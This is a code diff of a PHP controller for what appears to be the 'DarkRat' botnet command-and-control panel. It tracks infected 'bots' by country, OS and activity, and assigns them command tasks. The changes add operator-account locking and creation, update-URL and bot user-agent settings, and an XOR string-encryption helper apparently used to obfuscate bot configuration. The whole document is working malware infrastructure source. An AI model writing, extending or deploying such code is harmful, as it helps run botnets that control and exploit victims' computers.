@@ -30,7 +30,7 @@ class Main{
         }
     }
 
-    function getClientCount($sec,$key){
+    private function getClientCount($sec,$key){
         $statement = $GLOBALS["pdo"]->prepare("SELECT COUNT(*) as count FROM bots WHERE UNIX_TIMESTAMP(install_date) + ? ".$key." UNIX_TIMESTAMP()");
         $statement->execute(array($sec)); // 1 Day
         $result = $statement->fetch();
@@ -54,19 +54,14 @@ class Main{
              foreach ($GLOBALS["pdo"]->query($sql) as $row) {
                  $return[ strtolower( $row["country"])] = intval ($row["NUM"]);
              }
-             //GET ONLINE CLIENTS
+            //GET ONLINE CLIENTS
             $onlinebotcount = $this->getClientCount(300,">"); // 5 min.
             //GET DEAD CLIENTS
             $deadbotcount = $this->getClientCount( 604800 * 7,"<"); // 14 Days
             //New Clients in Last x Days
             $lastclientscount = $this->getClientCount(86400,">" ); // 1 Day
-
             $last12hclientscount = $this->getClientCount(43200,">" ); // 12 Hours
             $last7clientscount = $this->getClientCount(604800,">" ); // 7 Days
-
-
-
-
 
             $GLOBALS["tpl"]->assign("allbots", $allbots);
             $GLOBALS["tpl"]->assign("worldmap", json_encode($return));
@@ -76,24 +71,24 @@ class Main{
             $GLOBALS["tpl"]->assign("lastclientscount", $lastclientscount);
             $GLOBALS["tpl"]->assign("last12hclientscount", $last12hclientscount);
             $GLOBALS["tpl"]->assign("last7clientscount", $last7clientscount);
-        }
+    }
 
-       private function random_string() {
-            if(function_exists('random_bytes')) {
-                $bytes = random_bytes(16);
-                $str = bin2hex($bytes);
-            } else if(function_exists('openssl_random_pseudo_bytes')) {
-                $bytes = openssl_random_pseudo_bytes(16);
-                $str = bin2hex($bytes);
-            } else if(function_exists('mcrypt_create_iv')) {
-                $bytes = mcrypt_create_iv(16, MCRYPT_DEV_URANDOM);
-                $str = bin2hex($bytes);
-            } else {
-                //Bitte euer_geheim_string durch einen zufälligen String mit >12 Zeichen austauschen
-                $str = md5(uniqid('euer_geheimer_string', true));
-            }
-            return $str;
+   private function random_string() {
+        if(function_exists('random_bytes')) {
+            $bytes = random_bytes(16);
+            $str = bin2hex($bytes);
+        } else if(function_exists('openssl_random_pseudo_bytes')) {
+            $bytes = openssl_random_pseudo_bytes(16);
+            $str = bin2hex($bytes);
+        } else if(function_exists('mcrypt_create_iv')) {
+            $bytes = mcrypt_create_iv(16, MCRYPT_DEV_URANDOM);
+            $str = bin2hex($bytes);
+        } else {
+            //Bitte euer_geheim_string durch einen zufälligen String mit >12 Zeichen austauschen
+            $str = md5(uniqid('euer_geheimer_string', true));
         }
+        return $str;
+    }
 
     public function tasks($botid = ""){
             $GLOBALS["template"][0] ="Main";
@@ -161,7 +156,7 @@ class Main{
                 $username = $_POST['userid'];
                 $passwort = $_POST['pswrd'];
                 
-                $statement = $GLOBALS["pdo"]->prepare("SELECT * FROM users WHERE username = :username");
+                $statement = $GLOBALS["pdo"]->prepare("SELECT * FROM users WHERE username = :username AND active = 1");
                 $result = $statement->execute(array('username' => $username));
                 $user = $statement->fetch();
                     
@@ -190,9 +185,6 @@ class Main{
             if(empty($_SESSION["darkrat_userid"])) {
                 die("Login Required");
             }
-
-
-
             $GLOBALS["template"][0] ="Main";
             $GLOBALS["template"][1] ="taskdetails";
             $sql = "SELECT  COUNT(bots.id) as NUM, tasks_completed.bothwid, tasks_completed.status, tasks_completed.taskid, bots.country, bots.computrername, bots.operingsystem, tasks.task, tasks.command, tasks.filter, tasks.status as taskstatus FROM `tasks_completed` 
@@ -257,17 +249,53 @@ class Main{
             $statementConfig = $GLOBALS["pdo"]->prepare("SELECT * FROM config WHERE id = ?");
             $statementConfig->execute(array("1"));
             $config = $statementConfig->fetch();
-
+            $encryptedOUT = "";
            if(!empty($_POST)){
-
                 if(!empty($_POST["enryptionkey"])){
                     $statement = $GLOBALS["pdo"]->prepare("UPDATE config SET enryptionkey = ? WHERE id = ?");
-                    $result = $statement->execute(array($_POST["enryptionkey"],1));
+                    $statement->execute(array($_POST["enryptionkey"],1));
+                }
+                if(!empty($_POST["updateinfo"])){
+                    $statement = $GLOBALS["pdo"]->prepare("UPDATE config SET check_update_url = ? WHERE id = ?");
+                    $statement->execute(array($_POST["updateinfo"],1));
+                }
+                if(!empty($_POST["useragent"])){
+                    $statement = $GLOBALS["pdo"]->prepare("UPDATE config SET useragent = ? WHERE id = ?");
+                    $statement->execute(array($_POST["useragent"],1));
+                }
+                if(!empty($_POST["blockuser"])){
+                    $statement = $GLOBALS["pdo"]->prepare("UPDATE users SET active = ? WHERE id = ?");
+                    $active = 1;
+                    if($_POST["blockuser"] == "lock"){
+                        $active = 0;
+                    }
+                    $statement->execute(array($active,$_POST["userid"]));
                 }
 
+                if(!empty($_POST["createuser_username"]) && !empty($_POST["createuser_password"])){
+                    //Check if user Exists
+                    $statement = $GLOBALS["pdo"]->prepare("SELECT * FROM users WHERE username = :username");
+                    $result = $statement->execute(array('username' => $_POST["createuser_username"]));
+                    $user = $statement->fetch();
+                    if($user !== false) {
+                        die("Sorry The User Exists");
+                    }else{
+                        $passwort_hash = password_hash($_POST["createuser_password"], PASSWORD_DEFAULT);
+                        $statement = $GLOBALS["pdo"]->prepare("INSERT INTO users (username, passwort) VALUES (:username, :passwort)");
+                        $statement->execute(array('username' => $_POST["createuser_username"], 'passwort' => $passwort_hash));
+                    }
+                }
+
+                if(!empty($_POST["encrypt"])){
+                    $handler = new BotHandler();
+                    $encryptedOUT =$handler->xor_this($_POST["encrypt"]);
+                }else{
+                    Header("Location: /settings");
+                }
            }
             $GLOBALS["tpl"]->assign("users", $users);
             $GLOBALS["tpl"]->assign("config", $config);
+            $GLOBALS["tpl"]->assign("encryptedOUT", $encryptedOUT);
         }
         public  function botinfo($id){
             if(empty($_SESSION["darkrat_userid"])) {
